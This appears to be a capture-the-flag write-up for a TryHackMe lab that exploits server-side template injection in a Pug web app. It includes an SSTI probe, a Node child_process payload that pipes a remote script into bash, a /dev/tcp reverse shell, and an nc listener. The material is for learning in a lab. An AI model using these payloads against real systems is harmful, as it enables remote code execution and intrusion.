# 82 - Templates (PUG Template exploitation \[SSTI])

Room Link --> [https://tryhackme.com/room/templates](https://tryhackme.com/room/templates)

On the Main webpage via port 5000.

<figure><img src=".gitbook/assets/image (564).png" alt=""><figcaption></figcaption></figure>

Click on the **Convert to HTML** button, itâ€™ll convert the template to HTML.

To make it easier to visualize the request, It was a POST request to `/render` with a parameter of `template` .

<figure><img src=".gitbook/assets/image (565).png" alt=""><figcaption></figcaption></figure>

**Exploit**

A google search of `pug template injection` lead me to this:

* [Pentesting PUG](https://exploit-notes.hdks.org/exploit/web/template-engine/pug-pentesting/)
* I got payload from [Hacktricks](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection)

To test if the app is vulnerable to SSTI.

```bash
dking@dking ~/Downloads$ curl http://10.10.188.23:5000/render -X POST -d 'template=#{7*10}'                    
<html><head></head><body><pre>&lt;70&gt;&lt;/70&gt;</pre></body></html>%  
```

We are seeing the result for `7 * 10` .

### Initial Access

{% code overflow="wrap" lineNumbers="true" %}
```bash
# 1
# create a shell.sh file with content
bash -i >& /dev/tcp/10.18.88.214/9000 0>&1

# 2
# host it with python web server.
python3 -m http.server

# 3
# setup NC listener.
nc -nvlp 9000

# 4
# execute the cmd (i used curl here).
curl http://10.10.188.23:5000/render -X POST -d 'template=#{function(){localLoad=global.process.mainModule.constructor._load;sh=localLoad("child_process").exec("curl 10.18.88.214/shell.sh | bash")}()}'
```
{% endcode %}

And got shell.

<figure><img src=".gitbook/assets/image (566).png" alt=""><figcaption></figcaption></figure>

Got the flag.

Done!

